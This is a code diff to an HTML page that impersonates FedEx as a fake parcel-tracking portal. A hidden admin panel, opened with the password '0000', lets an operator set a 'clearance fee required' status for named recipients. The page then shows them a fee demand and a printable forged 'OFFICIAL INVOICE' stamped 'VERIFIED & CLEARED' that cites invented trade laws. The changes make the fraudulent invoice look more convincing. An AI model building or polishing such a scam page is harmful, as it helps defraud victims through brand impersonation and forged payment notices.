@@ -26,21 +26,24 @@
         
         #pay-box { display: none; margin-top: 15px; padding: 15px; background: #fff3cd; border-radius: 8px; color: #856404; border-left: 4px solid #ffc107; }
 
-        /* 1: PROFESSIONAL FULL-PAGE INVOICE */
+        /* ONE FULL SHEET INVOICE CORRECTION */
         @media print { 
-            body * { visibility: hidden; } 
-            #invoice-wrap, #invoice-wrap * { visibility: visible; } 
-            #invoice-wrap { position: absolute; left: 0; top: 0; width: 100%; height: 100vh; display: block !important; background: #fff; padding: 0; margin: 0; }
+            @page { size: auto; margin: 0; }
+            body { background: white; }
+            .nav, .wrapper, #google_translate_element { display: none !important; } 
+            #invoice-wrap { display: block !important; position: absolute; top: 0; left: 0; width: 100%; height: 100%; margin: 0; padding: 40px; border: none; }
+            #invoice-wrap * { visibility: visible; }
         }
-        #invoice-wrap { display: none; background: #fff; color: #000; width: 100%; min-height: 100vh; padding: 50px; box-sizing: border-box; }
+
+        #invoice-wrap { display: none; background: #fff; color: #000; width: 100%; min-height: 100vh; box-sizing: border-box; }
         .inv-header { display: flex; justify-content: space-between; border-bottom: 5px solid var(--p); padding-bottom: 20px; margin-bottom: 30px; }
-        .stamp { border: 3px solid #d00; color: #d00; padding: 10px; font-weight: 900; text-transform: uppercase; transform: rotate(-15deg); display: inline-block; border-radius: 10px; margin: 20px 0; opacity: 0.8; }
+        .stamp-red { border: 4px solid #d00; color: #d00; padding: 8px 15px; font-weight: 900; text-transform: uppercase; transform: rotate(-12deg); display: inline-block; border-radius: 5px; margin: 15px 0; font-size: 20px; }
         .inv-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 40px; margin-bottom: 30px; }
-        .inv-table { width: 100%; border-collapse: collapse; margin-top: 30px; }
-        .inv-table th { background: var(--p); color: #fff; padding: 15px; text-align: left; }
-        .inv-table td { padding: 15px; border-bottom: 2px solid #eee; }
-        .total-area { margin-top: 30px; border-top: 2px solid #000; padding-top: 15px; text-align: right; font-size: 22px; font-weight: bold; }
-        .barcode { background: #000; height: 40px; width: 250px; margin-top: 20px; opacity: 0.7; }
+        .inv-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        .inv-table th { background: var(--p); color: #fff; padding: 12px; text-align: left; }
+        .inv-table td { padding: 12px; border-bottom: 1px solid #eee; }
+        .total-area { margin-top: 20px; border-top: 3px solid #000; padding-top: 10px; text-align: right; font-size: 24px; font-weight: bold; }
+        .barcode-strip { background: repeating-linear-gradient(90deg, #000, #000 2px, #fff 2px, #fff 4px); height: 50px; width: 280px; margin-top: 30px; }
     </style>
 </head>
 <body>
@@ -49,13 +52,13 @@
 
 <div class="nav">
     <div class="logo" onclick="openAdmin()">Fed<span style="color:var(--o)">ex</span></div>
-    <div style="font-size:11px">Global Logistics & Distribution</div>
+    <div style="font-size:11px">Secure Logistics Portal</div>
 </div>
 
 <div class="wrapper">
     <div class="card" id="client-view">
         <h2 style="margin:0 0 15px 0; color:var(--p)">Track Shipment</h2>
-        <input type="text" id="trackInput" placeholder="Enter Tracking Number">
+        <input type="text" id="trackInput" placeholder="Enter Tracking ID">
         <button class="btn btn-o" id="mainTrackBtn" onclick="handleTracking()">TRACK</button>
 
         <div id="result">
@@ -65,25 +68,25 @@
             <div class="row"><span>Destination:</span> <b id="r-dest"></b></div>
             <div class="row"><span>Departure:</span> <b id="r-takeoff"></b></div>
             <div class="row"><span>Arrival:</span> <b id="r-reach"></b></div>
-            <div class="row"><span>Updated:</span> <b id="r-date"></b></div>
+            <div class="row"><span>Last Update:</span> <b id="r-date"></b></div>
             <img id="r-img" class="pkg-img">
             
             <div id="pay-box">
                 <p id="pay-msg"></p>
-                <button class="btn" style="background:#333; color:white;" onclick="window.print()">Download Official Invoice</button>
+                <button class="btn" style="background:#333; color:white;" onclick="window.print()">DOWNLOAD OFFICIAL INVOICE</button>
             </div>
         </div>
     </div>
 
     <div id="admin-panel">
-        <h3>Shipment Management</h3>
+        <h3>Admin Tools</h3>
         <input type="text" id="a-code" placeholder="Tracking ID">
         <input type="text" id="a-name" placeholder="Client Name">
-        <input type="text" id="a-origin" placeholder="Shipping From">
-        <input type="text" id="a-dest" placeholder="Shipping To">
-        <input type="text" id="a-takeoff" placeholder="Departure Date/Time">
-        <input type="text" id="a-reach" placeholder="Estimated Arrival">
-        <input type="number" id="a-fee" placeholder="Clearance Amount ($)">
+        <input type="text" id="a-origin" placeholder="Origin City">
+        <input type="text" id="a-dest" placeholder="Destination City">
+        <input type="text" id="a-takeoff" placeholder="Departure Date">
+        <input type="text" id="a-reach" placeholder="Arrival Date">
+        <input type="number" id="a-fee" placeholder="Fee Amount ($)">
         
         <select id="a-status">
             <option value="Loading">Loading</option>
@@ -94,63 +97,63 @@
             <option value="Arrived (Clearance fee required)">Arrived (Clearance fee required)</option>
         </select>
         <input type="file" id="a-file" accept="image/*">
-        <button class="btn btn-o" id="saveBtn" onclick="saveToCloud()">SAVE TO CLOUD</button>
-        <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">LOGOUT</button>
+        <button class="btn btn-o" id="saveBtn" onclick="saveToCloud()">SAVE SHIPMENT</button>
+        <button class="btn" style="margin-top:10px; background:#444; color:white;" onclick="location.reload()">EXIT</button>
     </div>
 </div>
 
 <div id="invoice-wrap">
     <div class="inv-header">
         <div>
-            <h1 style="color:var(--p); margin:0; font-size:45px;">FedEx<span style="color:var(--o)">.</span></h1>
-            <p style="letter-spacing: 2px;">EXPRESS GLOBAL LOGISTICS</p>
+            <h1 style="color:var(--p); margin:0; font-size:40px;">FedEx<span style="color:var(--o)">.</span></h1>
+            <p style="font-weight:bold; letter-spacing:1px;">Priority Express Global</p>
         </div>
         <div style="text-align: right;">
-            <h2 style="margin:0; font-size:30px;">OFFICIAL NOTICE</h2>
-            <p>Tracking Ref: <span id="inv-code" style="font-weight:bold;"></span></p>
+            <h2 style="margin:0; font-size:28px;">OFFICIAL INVOICE</h2>
+            <p>Ref No: <span id="inv-code" style="font-weight:900;"></span></p>
         </div>
     </div>
 
     <div class="inv-grid">
         <div>
-            <p style="color:#666; font-size:12px; margin-bottom:5px;">CONSIGNEE DETAILS:</p>
-            <p style="font-size:18px; font-weight:bold; margin:0;" id="inv-name"></p>
-            <p style="margin:5px 0;" id="inv-dest"></p>
+            <p style="color:#777; font-size:11px; margin:0;">CONSIGNEE:</p>
+            <p style="font-size:20px; font-weight:bold; margin:2px 0;" id="inv-name"></p>
+            <p id="inv-dest" style="margin:0; color:#444;"></p>
         </div>
         <div style="text-align: right;">
-            <p style="color:#666; font-size:12px; margin-bottom:5px;">ISSUE DATE:</p>
-            <p style="font-size:18px; font-weight:bold; margin:0;" id="inv-date"></p>
-            <div class="stamp">Verified & Cleared</div>
+            <p style="color:#777; font-size:11px; margin:0;">DATE OF ISSUE:</p>
+            <p style="font-size:18px; font-weight:bold; margin:2px 0;" id="inv-date"></p>
+            <div class="stamp-red">VERIFIED & CLEARED</div>
         </div>
     </div>
 
     <table class="inv-table">
         <thead>
             <tr>
-                <th>Item / Description</th>
-                <th>Quantity</th>
-                <th>Service</th>
-                <th>Subtotal</th>
+                <th>Description of Charges</th>
+                <th>Qty</th>
+                <th>Priority</th>
+                <th>Total</th>
             </tr>
         </thead>
         <tbody>
             <tr>
-                <td>International Regulatory Clearance & Customs Surcharge</td>
+                <td>International Regulatory Clearance & Customs Duties</td>
                 <td>1</td>
-                <td>Priority Express</td>
+                <td>Overnight</td>
                 <td>$<span id="inv-fee"></span></td>
             </tr>
         </tbody>
     </table>
 
     <div class="total-area">
-        TOTAL CLEARANCE FEE DUE: $<span id="inv-fee-total"></span>
+        TOTAL AMOUNT DUE: $<span id="inv-fee-total"></span>
     </div>
 
-    <div style="margin-top:50px;">
-        <p><b>Important Notice:</b> This shipment is currently stationed at the regional processing hub. According to the International Trade Act, the administrative fees listed above must be settled before final home-delivery release. Failure to comply may result in temporary storage surcharges.</p>
-        <div class="barcode"></div>
-        <p style="font-size:10px; color:#888; margin-top:20px;">© 2026 FedEx Corporation. This document is a legal notification for customs purposes.</p>
+    <div style="margin-top:60px;">
+        <p style="font-size:14px; line-height:1.5;"><b>Notice to Consignee:</b> This package is currently held at our logistics hub pending administrative clearance. Per the Global Trade Protocol, the settlement of the duties listed above is mandatory for final home-delivery release. This document is electronically verified.</p>
+        <div class="barcode-strip"></div>
+        <p style="font-size:11px; color:#999; margin-top:20px; border-top:1px solid #eee; padding-top:10px;">© 2026 FedEx Global. All rights reserved. Registered with International Customs Agency.</p>
     </div>
 </div>
 
@@ -167,7 +170,7 @@
     const KEY = P1 + P2 + P3;
 
     function openAdmin() {
-        if(prompt("Pass") === "0000" && prompt("Token") === "0000") {
+        if(prompt("Auth Password") === "0000" && prompt("Secure Token") === "0000") {
             document.getElementById('client-view').style.display = 'none';
             document.getElementById('admin-panel').style.display = 'block';
         }
@@ -189,7 +192,7 @@
         const res = await fetch(`https://api.github.com/repos/${U}/${R}/contents/data.json?v=${Date.now()}`, {
             headers: { "Authorization": `token ${KEY}` }
         });
-        if(!res.ok) return alert("System Error");
+        if(!res.ok) return alert("System Sync Error");
         
         const file = await res.json();
         const data = JSON.parse(atob(file.content));
@@ -197,9 +200,8 @@
 
         if(s) {
             document.getElementById('result').style.display = 'block';
-            const badge = document.getElementById('st-badge');
-            badge.innerText = s.status;
-            badge.style.background = s.status.includes("Arrived") ? "#d4edda" : "#eee";
+            document.getElementById('st-badge').innerText = s.status;
+            document.getElementById('st-badge').style.background = s.status.includes("Arrived") ? "#d4edda" : "#eee";
             
             document.getElementById('r-name').innerText = s.name;
             document.getElementById('r-origin').innerText = s.origin;
@@ -214,12 +216,10 @@
             }
 
             const payBox = document.getElementById('pay-box');
-            const payMsg = document.getElementById('pay-msg');
-            
             if(s.status.includes("Arrived") || s.status.includes("Pending")) {
                 payBox.style.display = 'block';
-                payMsg.innerHTML = s.status.includes("Arrived") 
-                    ? `<b>Clearance Fee Required:</b> A fee of <b>$${s.fee}</b> is needed for release.` 
+                document.getElementById('pay-msg').innerHTML = s.status.includes("Arrived") 
+                    ? `<b>Clearance Fee Required:</b> A payment of <b>$${s.fee}</b> is needed.` 
                     : `<b>Pending:</b> Custom fee of <b>$${s.fee}</b> needed.`;
 
                 // Set Invoice Data
@@ -230,7 +230,7 @@
                 document.getElementById('inv-fee-total').innerText = s.fee;
                 document.getElementById('inv-date').innerText = s.date;
             } else { payBox.style.display = 'none'; }
-        } else { alert("Not Found"); }
+        } else { alert("ID Not Found"); }
     }
 
     async function saveToCloud() {
@@ -249,7 +249,6 @@
         }
 
         const dateOnly = new Date().toLocaleDateString('en-GB');
-
         const payload = {
             name: document.getElementById('a-name').value,
             origin: document.getElementById('a-origin').value,
@@ -276,14 +275,14 @@
             method: "PUT",
             headers: { "Authorization": `token ${KEY}` },
             body: JSON.stringify({
-                message: "Update " + id,
+                message: "Shipment Updated",
                 content: btoa(unescape(encodeURIComponent(JSON.stringify(db, null, 2)))),
                 sha: sha
             })
         });
 
-        if(push.ok) { alert("Saved!"); location.reload(); }
-        else { alert("Error"); btn.disabled = false; }
+        if(push.ok) { alert("Successfully Synced!"); location.reload(); }
+        else { alert("Sync Failed."); btn.disabled = false; }
     }
 </script>
 </body>
